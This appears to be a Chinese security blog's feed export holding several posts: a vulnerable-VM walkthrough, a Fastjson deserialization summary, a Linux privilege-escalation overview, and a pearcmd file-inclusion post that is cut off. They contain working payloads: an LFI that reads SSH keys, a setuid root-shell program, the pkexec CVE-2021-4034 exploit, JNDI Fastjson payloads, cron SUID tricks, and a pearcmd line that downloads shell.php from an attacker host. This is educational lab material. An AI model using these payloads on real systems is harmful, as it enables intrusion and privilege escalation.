利用公私钥登录而无需输入密码，需要更改如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击机生成 存放在~&#x2F;.ssh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa <span class="comment">#三次回车</span></span><br><span class="line">id_rsa : 私钥</span><br><span class="line">id_rsa.pub : 公钥</span><br></pre></td></tr></table></figure><p>上传公钥至目标主机即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径  /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>言归正转，这里利用私钥登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa user@192.168.6.152</span><br></pre></td></tr></table></figure><p>通过读取&#x2F;etc&#x2F;passwd </p><p>最后的:&#x2F;bin&#x2F;bash表示可以远程登录</p><p>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys 恰好是靶机生成的 id_rsa.pub</p><p>读取私钥文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">height</span>=<span class="string">&quot;2000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span>  <span class="attr">src</span>=<span class="string">&quot;http://192.168.6.142:2333/read.php?url=/home/gemini1/.ssh/id_rsa&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030215511357.png" class="" title="image-20231030215511357"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh -i id_rsa gemini1@192.168.6.152</span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030215920231.png" class="" title="image-20231030215920231"><h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223053356.png" class="" title="image-20231030223053356"><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223127895.png" class="" title="image-20231030223127895"><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223217342.png" class="" title="image-20231030223217342"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 4.9.0-4-amd64</span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223343269.png" class="" title="image-20231030223343269"><h2 id="suid提权-环境变量劫持"><a href="#suid提权-环境变量劫持" class="headerlink" title="suid提权 环境变量劫持"></a>suid提权 环境变量劫持</h2><p>查找具有SUID权限的程序：</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030222905528.png" class="" title="image-20231030222905528"><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030224302695.png" class="" title="image-20231030224302695"><p>执行listinfo</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030224409743.png" class="" title="image-20231030224409743"><p>主要执行了上面的四条命令</p><h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><p>攻击者取得一个shell 但是没有root权限 找到root用户创建的具有u+s 权限的文件假如这个文件名是sky 运行这个文件执行了一个系统指令如 ls</p><p>这个时候攻击者创造一个在&#x2F;tmp目录下文件名字是ls 的可执行文件 通过修改环境变量 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">./sky</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc date.c -o date               # 编译date.c</span><br><span class="line">export PATH=/tmp:$PATH               # 添加环境变量</span><br><span class="line">listinfo</span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030230440809.png" class="" title="image-20231030230440809"><h1 id="pkexec提权"><a href="#pkexec提权" class="headerlink" title="pkexec提权"></a>pkexec提权</h1><p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-4034/</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030231414799.png" class="" title="image-20231030231414799">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境 &lt;/p&gt;
&lt;p&gt;攻击机 kali IP 192.168.6.142&lt;/p&gt;
&lt;p&gt;靶机  Gemini-Pentest-v1 IP 192.168.6.152 &lt;/p&gt;
&lt;h1 id=&quot;0x00-信息收集&quot;&gt;&lt;a href=&quot;#0x00-信息收集&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="-靶机渗透" scheme="http://example.com/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞总结</title>
    <link href="http://example.com/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2023-09-09T09:47:31.000Z</published>
    <updated>2023-09-21T13:12:58.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>本文以时间的顺序来叙述fastjson的前世今生，Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。</p><p>FastJSON可以使用@type属性将JSON字符串转化为指定的类</p><p><strong>反弹 SHELL（目标 java 版本过高，反弹 shell 不成功）</strong></p><p><strong>基于 RMI 的利用方式，JDK 版本限制在 6u132、7u131、8u121 之前，在 8u122 及之后的版本中，加入了反序列化白名单的机制，关闭了 RMI 远程加载代码</strong></p><p><strong>基于 LDAP 的利用方式，JDK 版本限制于 6u211、7u201、8u191、11.0.1 之前，在 8u191 版本中，Oracle 对LDAP 设置限制，发布了 CVE-2018-3149，关闭 JNDI 远程类加载</strong></p><h1 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a>0x01 漏洞成因</h1><p>从 fastjson 漏洞形成的原因看，是目标网站在解析 json 时，未对 json 内容进行验证，直接将 json 解析成 java 对象并执行，这就给了攻击者可乘之机，构造对应的 payload ，让系统执行，然后达到代码执行，甚至命令执行的目的。</p><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，但是如果我们构造恶意的json数据使用@type指定一个想要的攻击类库就可以实现攻击。</p><p>但是如果要对@type指定的类进行反序列化调用的话 内置bean必须满足以下条件：</p><p>当JSON字符串转换成对象时，如果setter方法满足如下条件，会调用setter方法为对象的属性赋值</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>返回值为void或者当前类</li><li>以set开头且第四个字母为大写</li><li>参数个数为1个</li></ul><p>当不满足如上条件之一时，但是getter方法满足如下条件时，会调用getter方法</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>以get开头且第四个字母为大写</li><li>无参数传入</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li><li>此属性没有setter方法</li></ul><p>我们这里可以进行一个payload分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,&quot;</span> + <span class="string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>com.sun.rowset.JdbcRowSetImpl</strong> 为被@type所指定的类 ，<strong>dataSourceName</strong>，**autoCommit **是JdbcRowSetImpl类中的属性 这里在进行JSON.parse()时赋值，这个过程中的顺序是根据payload发生的所以顺序不能乱。</p><p>Fastjson还有以下功能点：</p><ol><li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li><li>fastjson 在为类属性寻找getter&#x2F;setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li><li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li></ol><h1 id="0x03-fastjson-lt-x3D-1-2-24"><a href="#0x03-fastjson-lt-x3D-1-2-24" class="headerlink" title="0x03 fastjson&lt;&#x3D;1.2.24"></a>0x03 fastjson&lt;&#x3D;1.2.24</h1><p>此时fastjson第一次出现 </p><p>此时可以利用的一个类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>JdbcRowSetImpl 内置javabean 并且可以进行一个主机端访问 外网的操作</p><p>当受害机 对json字符串进行JSON.parse()时</p><p>调用JdbcRowSetImpl类中的setter</p><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909201455900.png" class="" title="image-20230909201455900"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909201808682.png" class="" title="image-20230909201808682"><p>指向其父类BaseRowSet dataSource已经反序列化为我们构造的数据</p><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909202100828.png" class="" title="image-20230909202100828"><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:6666/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x04-Fastjson-lt-1-2-48"><a href="#0x04-Fastjson-lt-1-2-48" class="headerlink" title="0x04 Fastjson&lt;1.2.48"></a>0x04 Fastjson&lt;1.2.48</h1><p>fastjson于1.2.24版本后增加了反序列化白名单，并且fastjson&gt;&#x3D;1.2.25 autoTypeSupport默认为false，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>当没有开启autoType时</p><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910133640225.png" class="" title="image-20230910133640225"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909234405061.png" class="" title="image-20230909234405061"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910133725098.png" class="" title="image-20230910133725098"><p>Fastjson在开始解析json前会优先加载配置，在加载配置时会调用TypeUtils的addBaseClassMappings和loadClass方法将一些经常会用到的基础类和三方库存放到一个ConcurrentMap对象mappings中，类似于缓存机制。这里将设置的类存入缓存中</p><p>而java.lang.class该类恰好存在于deserializers对象的buckets属性中：</p><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910142518814.png" class="" title="image-20230910142518814"><p>接着获取到java.lang.class对应的反序列化处理类MiscCodec</p><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910142635645.png" class="" title="image-20230910142635645"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910142818541.png" class="" title="image-20230910142818541"><p>在MiscCodec类中，java.lang.class拥有加载任意类到mappings中的功能。首先从输入的json串中解析获取val对应的键值：</p><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910143140867.png" class="" title="image-20230910143140867"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910150208948.png" class="" title="image-20230910150208948"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910150416771.png" class="" title="image-20230910150416771"><img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910144414938.png" class="" title="image-20230910144414938"><p>第一步利用java.lang.class加载黑名单类到mappings中，第二步直接从mappings中取出黑名单类完成漏洞利用。</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1097/Object&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x05-1-2-48-lt-x3D-fastjson-lt-x3D-1-2-68"><a href="#0x05-1-2-48-lt-x3D-fastjson-lt-x3D-1-2-68" class="headerlink" title="0x05 1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68"></a>0x05 1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68</h1><p>在TypeUtils的deserialze中将cache设置成false，不允许存入缓存</p><p>以后补上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;本文以时间的顺序来叙述fastjson的前世今生，Fastjson是阿里巴巴的开源JSON解析库，它</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>linux提权总结</title>
    <link href="http://example.com/2023/09/09/linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/09/09/linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2023-09-09T09:46:29.000Z</published>
    <updated>2023-09-09T09:46:39.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-为什么要提权"><a href="#0x00-为什么要提权" class="headerlink" title="0x00 为什么要提权"></a>0x00 为什么要提权</h2><p>当我们取得一个简单的命令交互式界面后，往往因为非root权限所作出的操作会被限制，提权所作出的就是进一步扩大我们的执行权限,操作空间。(本文主要分析提权的应对思路，具体操作可以自己进行科普)</p><h2 id="0x01-内核提权"><a href="#0x01-内核提权" class="headerlink" title="0x01 内核提权"></a>0x01 内核提权</h2><p>在实际环境中，内核提权是最常使用的提权方法，通杀的内核提权很难找到，但是可以根据不同的系统进行针对性的策略</p><p>内核提权是利用Linux内核的漏洞进行提权的，内核漏洞进行提权一般包括三个环节：</p><p>1、对目标系统进行信息收集，获取到系统内核信息及版本信息；</p><p>2、根据内核版本获取其对应的漏洞以及EXP</p><p>3、使用找到的EXP对目标系统发起攻击，完成提权操作</p><p>1.信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whoami                   # 查看当前用户权限，如果是root用户就不用提权；</span><br><span class="line">uname -a                 # 查看linux操作系统内核信息</span><br><span class="line">uname -r                 # 查看内核版本</span><br><span class="line">cat /proc/version        # 查看linux系统当前操作系统版本信息</span><br><span class="line">cat /etc/issue           # 查看linux当前操作系统发行版本信息</span><br><span class="line">cat /etc/redhat-releas   # 查看linux当前操作系统发行版本信息</span><br><span class="line">cat /etc/*-release       # 查看linux当前操作系统发行版本信息</span><br></pre></td></tr></table></figure><p>2.使用SearchSploit(kali自带的工具)</p><img src="/2023/09/09/linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20230906192517728.png" class="" title="image-20230906192517728"><p>输入 <code>searchsploit -m 9479.c</code> 就会自动复制该文件到当前目录</p><p>3.将文件上传到被攻击机上编译 运行</p><h2 id="0x02-sudo提权"><a href="#0x02-sudo提权" class="headerlink" title="0x02 sudo提权"></a>0x02 sudo提权</h2><p>在Linux&#x2F;Unix中，&#x2F;etc&#x2F;sudoers文件是sudo权限的配置文件，其中储存了一些用户或组可以以root权限使用的命令</p><p><strong>受影响版本：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo</span>: <span class="number">1.8</span><span class="number">.2</span> - <span class="number">1.8</span>.31p2</span><br><span class="line"><span class="attr">sudo</span>: <span class="number">1.9</span><span class="number">.0</span> - <span class="number">1.9</span>.5p1</span><br></pre></td></tr></table></figure><p><strong>检测方法：</strong></p><p>以非root用户登录系统，并运行如下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure><p>- 如果响应一个以<code>sudoedit:</code>开头的报错，那么表明存在漏洞。</p><p>- 如果响应一个以<code>usage:</code>开头的报错，那么表明补丁已经生效。</p><p>cat &#x2F;etc&#x2F;sudoers </p><p>查看<strong>root ALL&#x3D;(ALL:ALL)</strong> <strong>ALL</strong> 附近是否有新的用户痕迹</p><h2 id="0x03-suid提权"><a href="#0x03-suid提权" class="headerlink" title="0x03 suid提权"></a>0x03 suid提权</h2><p>​SUID (Set  UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.</p><p>​在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件<code>ls</code>,其属主为root,当我们通过非root用户登录时,如果<code>ls</code>设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限</p><h3 id="查找具有-SUID-权限位文件"><a href="#查找具有-SUID-权限位文件" class="headerlink" title="查找具有 SUID 权限位文件"></a><strong>查找具有 SUID 权限位文件</strong></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><h2 id="0x04-明文root密码提权"><a href="#0x04-明文root密码提权" class="headerlink" title="0x04 明文root密码提权"></a>0x04 明文root密码提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[注册名]:[口令]:[用户标识号]:[组标识号]:[用户名]:[用户主目录]:[命令解析程序]</span><br></pre></td></tr></table></figure><h3 id="x2F-etc-x2F-passwd"><a href="#x2F-etc-x2F-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h3><p>Linux系统使用一个专门的文件来将用户的登录名匹配到对应的UID值，我们可以使用命令 sudo nvim &#x2F;etc&#x2F;passwd 进行查看，包含了一些与用户相关的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0::/root:/bin/bash</span><br><span class="line">kato:x:1000:1000:kato:/home/kato:/usr/bin/zsh</span><br></pre></td></tr></table></figure><p>其实这个文件有很多条信息，我只单独列出这两条。很清晰的看到每条信息由7个字段组成，由:隔开。<br>字段包含如下信息：<br>1️⃣ 登录用户名<br>2️⃣ 用户密码（进行了别的处理，这里x简单表示，加密后存储在&#x2F;etc&#x2F;shadow文件中）<br>3️⃣ 用户账户的UID（数字形式）<br>4️⃣ 用户账户的组ID（GID）（数字形式）<br>5️⃣ 用户账户的文本描述（称为备注字段）<br>6️⃣ 用户HOME目录位置<br>7️⃣ 用户的默认shell</p><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的，当管理员的passwd和shadow一些权限配置不当就可能会导致提权</p><p>当shadow可读时借助工具john</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=字典文件 + shadow文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x05-计划任务提权"><a href="#0x05-计划任务提权" class="headerlink" title="0x05 计划任务提权"></a>0x05 计划任务提权</h3><p>大概思路就是，对于可能存在的权限配置不当的有<code>root</code>权限的计划任务，使我们普通用户也拥有修改权限，我们修改其中的内容，为<code>bash、less、more</code>等赋予<code>SUID</code>权限，与<code>SUID</code>提权结合，使之提权成功。</p><blockquote><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是&#x2F;etc&#x2F;内系统的计划任务可以被列出。</p></blockquote><p>利用如下的命令可以列出一些计划任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br><span class="line"></span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure><p>这里我们如果遇到有权限配置为<code>777</code>即<code>-rwxrwxrwx</code>的计划任务，我们就可以对文件内容进行修改，进行提权。<br><code>cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;</code><br>对<code>bash</code>赋予<code>SUID</code>权限。<br>当然，如果对<code>vim、less、find</code>等命令赋权均可<br><code>cp /bin/vim /tmp/vim ; chmod u+s /tmp/vim; //为vim赋值</code><br>接下来等到任务执行即可。</p><h2 id="0x06第三方服务提权"><a href="#0x06第三方服务提权" class="headerlink" title="0x06第三方服务提权"></a>0x06第三方服务提权</h2><h2 id="0x07-rbash"><a href="#0x07-rbash" class="headerlink" title="0x07 rbash"></a>0x07 rbash</h2><p>1.什么是rbash</p><pre><code>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</code></pre><p>2.如何设置一个rbash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /bin/rbash # 复制一个bash，重命名为rbash</span><br><span class="line">useradd -s /bin/rbash test # 设置用户test登陆的shell为rbash</span><br><span class="line">mkdir -p /home/test/.bin # 在test用户下新建一个.bin目录存放可以执行的命令</span><br></pre></td></tr></table></figure><p>rbash逃逸</p><p><a href="https://blog.csdn.net/qq_43168364/article/details/111830233">https://blog.csdn.net/qq_43168364/article/details/111830233</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-为什么要提权&quot;&gt;&lt;a href=&quot;#0x00-为什么要提权&quot; class=&quot;headerlink&quot; title=&quot;0x00 为什么要提权&quot;&gt;&lt;/a&gt;0x00 为什么要提权&lt;/h2&gt;&lt;p&gt;当我们取得一个简单的命令交互式界面后，往往因为非root权限所作出的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pearcmd的妙用</title>
    <link href="http://example.com/2023/07/25/pearcmd%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <id>http://example.com/2023/07/25/pearcmd%E7%9A%84%E5%A6%99%E7%94%A8/</id>
    <published>2023-07-25T03:05:13.000Z</published>
    <updated>2023-07-25T03:14:58.171Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-利用条件"><a href="#0x00-利用条件" class="headerlink" title="0x00 利用条件"></a>0x00 利用条件</h1><p>(1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd.php的文件路径</p><p>(2）web环境下在php.ini中register_argc_argv设置为On</p><p>(3）存在文件包含，可以包含php文件并且没有open_basedir的限制</p><h1 id="0x01-真实环境"><a href="#0x01-真实环境" class="headerlink" title="0x01 真实环境"></a>0x01 真实环境</h1><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库</p><p>如何安装安装pear</p><p>PHP版本在7.3及以前，pecl&#x2F;pear是默认安装的</p><p>在7.4以后，需要我们在编译的时候指定–with-pear才会安装</p><p>网上说，在dokcer任意的版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。（然而总会遇到特殊的情况，没有这个文件的存在）</p><p>当没有这个文件存在时，可以尝试使用yum install php-pear去安装。</p><p>安装成功以后，执行pear命令可以得到</p><p><strong>两种路径、</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/usr/local/lib/php/pearcmd&quot;,  &quot;/usr/share/pear/pearcmd&quot;</span><br></pre></td></tr></table></figure><h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><h2 id="1出网"><a href="#1出网" class="headerlink" title="1出网"></a>1出网</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span><br></pre></td></tr></table></figure><h2 id="2不出网"><a href="#2不出网" class="headerlink" title="2不出网"></a>2不出网</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 